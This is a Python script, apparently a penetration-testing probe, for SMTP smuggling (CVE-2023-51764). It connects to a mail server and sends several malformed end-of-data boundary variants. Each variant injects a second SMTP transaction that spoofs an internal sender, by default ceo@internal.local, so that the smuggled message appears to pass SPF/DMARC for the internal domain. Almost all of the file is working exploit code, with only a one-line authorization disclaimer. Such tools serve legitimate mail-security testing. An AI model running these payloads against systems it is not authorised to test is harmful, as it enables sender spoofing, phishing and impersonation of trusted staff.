#!/usr/bin/env python3
"""smtp-smuggling-test.py — probe for the CVE-2023-51764 family of SMTP smuggling bugs.

Smuggling exploits a parser disagreement between the boundary-handling of an
INBOUND SMTP server (the one accepting your message) and an OUTBOUND server
(the next hop, often after relay). If the inbound treats bare `\\n` as a CRLF
but the outbound rebuilds the wire with proper CRLFs, you can sneak a SECOND
message into the same SMTP session that the outbound emits as if it came
from a trusted internal source -- bypassing DMARC/SPF checks against the
INTERNAL domain.

This probe sends a body designed so that:
    1. The inbound server treats `\\n.\\n` as end-of-data and accepts our first message
    2. The outbound emits both messages with valid DKIM/SPF (since they appear to
       originate inside the trust boundary)

We probe by sending DATA containing:
    Subject: outer\\r\\n
    \\r\\n
    body\\r\\n
    \\n.\\n
    MAIL FROM:<smuggled@INTERNAL>\\r\\n
    RCPT TO:<probe@external>\\r\\n
    DATA\\r\\n
    Subject: smuggled\\r\\n
    \\r\\n
    PROOF-OF-SMUGGLING\\r\\n
    .\\r\\n

If the inbound is vulnerable, the test SMTP transaction completes cleanly
and you see TWO Message-IDs at the outbound (the second from inside the
trust boundary). Direct visual confirmation requires a mailbox you control.

Authorized testing only. Run against your own mail flow.
"""
from __future__ import annotations
import argparse, socket, sys, time


def smtp_chat(sock: socket.socket, cmd: bytes, expect_codes=None, timeout=5) -> bytes:
    sock.sendall(cmd)
    sock.settimeout(timeout)
    chunks = []
    try:
        while True:
            data = sock.recv(4096)
            if not data: break
            chunks.append(data)
            # Stop at the canonical end-of-response line
            joined = b"".join(chunks)
            lines = joined.split(b"\r\n")
            if lines and lines[-2:-1] and lines[-2][:4] != b"" and lines[-2][3:4] == b" ":
                break
            if len(joined) > 1 << 16:
                break
    except socket.timeout:
        pass
    return b"".join(chunks)


def send_smuggle(host: str, port: int, helo: str, mail_from: str, rcpt_to: str,
                 smuggle_from: str, smuggle_to: str, marker: str,
                 variant: str = "bare-lf-dot") -> tuple[bytes, bool]:
    s = socket.create_connection((host, port), timeout=10)
    print(f"[*] Connected to {host}:{port}", flush=True)
    print(s.recv(4096).decode(errors="replace"), end="")

    print(f"[*] EHLO {helo}", flush=True)
    out = smtp_chat(s, f"EHLO {helo}\r\n".encode())
    print(out.decode(errors="replace"), end="")

    print(f"[*] MAIL FROM:<{mail_from}>", flush=True)
    out = smtp_chat(s, f"MAIL FROM:<{mail_from}>\r\n".encode())
    print(out.decode(errors="replace"), end="")

    print(f"[*] RCPT TO:<{rcpt_to}>", flush=True)
    out = smtp_chat(s, f"RCPT TO:<{rcpt_to}>\r\n".encode())
    print(out.decode(errors="replace"), end="")

    print("[*] DATA", flush=True)
    out = smtp_chat(s, b"DATA\r\n")
    print(out.decode(errors="replace"), end="")

    # Construct the body. The smuggled chunk varies by variant.
    body_outer = f"Subject: outer probe\r\nFrom: <{mail_from}>\r\nTo: <{rcpt_to}>\r\n\r\nThis is the OUTER message.\r\n"

    # Variants of the boundary bytes for testing:
    boundaries = {
        "bare-lf-dot":     b"\r\n.\n",            # CR+LF then bare LF + dot — most servers accept as end-of-data
        "bare-cr-dot":     b"\r\n.\r",            # CR before dot
        "lf-lf-dot":       b"\n.\n",              # bare LF terminators
        "dot-stuff":       b"\r\n..\r\n",         # dot-stuffed — should NOT terminate but some parsers fail
        "no-final":        b"\r\n",               # no dot terminator (just smuggle directly)
    }
    boundary = boundaries.get(variant, boundaries["bare-lf-dot"])

    smuggled = (
        f"MAIL FROM:<{smuggle_from}>\r\n"
        f"RCPT TO:<{smuggle_to}>\r\n"
        f"DATA\r\n"
        f"Subject: SMUGGLED [{marker}]\r\n"
        f"From: <{smuggle_from}>\r\nTo: <{smuggle_to}>\r\n\r\n"
        f"This message was smuggled. Marker: {marker}\r\n"
        f".\r\n"
    ).encode()

    full_data = body_outer.encode() + boundary + smuggled + b"\r\n.\r\n"
    print(f"[*] Sending {len(full_data)}-byte payload with boundary={variant!r}", flush=True)
    s.sendall(full_data)
    s.settimeout(15)
    try:
        resp = s.recv(8192)
    except socket.timeout:
        resp = b""
    print(resp.decode(errors="replace"), end="")

    # Try a QUIT
    try:
        smtp_chat(s, b"QUIT\r\n")
    except Exception:
        pass
    s.close()

    # If the server replied with TWO 250 OK lines, that's the strong tell of smuggling
    accepted_count = resp.count(b"250 2.0.0 Ok") + resp.count(b"250 Ok") + resp.count(b"250 OK") + resp.count(b"queued")
    return resp, accepted_count >= 2


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.split("\n\n")[0])
    ap.add_argument("--target",         required=True, help="host:port (e.g. mail.corp:25)")
    ap.add_argument("--from",           dest="mail_from", default="probe@external.example")
    ap.add_argument("--to",             dest="rcpt_to",   default="postmaster@internal.local",
                    help="should be a recipient you can read mail at, or postmaster")
    ap.add_argument("--smuggle-from",   default="ceo@internal.local",
                    help="spoofed envelope-from inside the trust boundary")
    ap.add_argument("--smuggle-to",     default="probe@external.example",
                    help="where the smuggled message gets delivered (a mailbox you control)")
    ap.add_argument("--helo",           default="recon.local")
    ap.add_argument("--marker",         default=f"PROBE-{int(time.time())}")
    ap.add_argument("--variant",        choices=["bare-lf-dot","bare-cr-dot","lf-lf-dot","dot-stuff","no-final","all"],
                    default="bare-lf-dot")
    args = ap.parse_args()

    if ":" not in args.target:
        print("error: --target must be host:port"); return 2
    host, port_s = args.target.rsplit(":", 1)
    port = int(port_s)

    variants = ["bare-lf-dot","bare-cr-dot","lf-lf-dot","dot-stuff","no-final"] if args.variant == "all" else [args.variant]
    for v in variants:
        print(f"\n{'='*60}\n  Variant: {v}\n{'='*60}\n")
        try:
            _, suspicious = send_smuggle(host, port, args.helo, args.mail_from, args.rcpt_to,
                                         args.smuggle_from, args.smuggle_to, args.marker, v)
            if suspicious:
                print(f"\n[!!] {v}: server accepted what looks like two transactions. SMUGGLING CANDIDATE.")
            else:
                print(f"\n[-] {v}: only one acceptance observed (good — likely safe variant).")
        except Exception as e:
            print(f"[!] {v}: error: {e}")
        time.sleep(1)

    print(f"\nFinal check: open the mailbox for {args.smuggle_to!r} and look for messages tagged {args.marker!r}.")
    print("If you see a message there with SMUGGLED in the subject AND it passed DMARC/SPF for the INTERNAL domain,")
    print("the inbound server is vulnerable to SMTP smuggling.")
    return 0

if __name__ == "__main__":
    sys.exit(main())
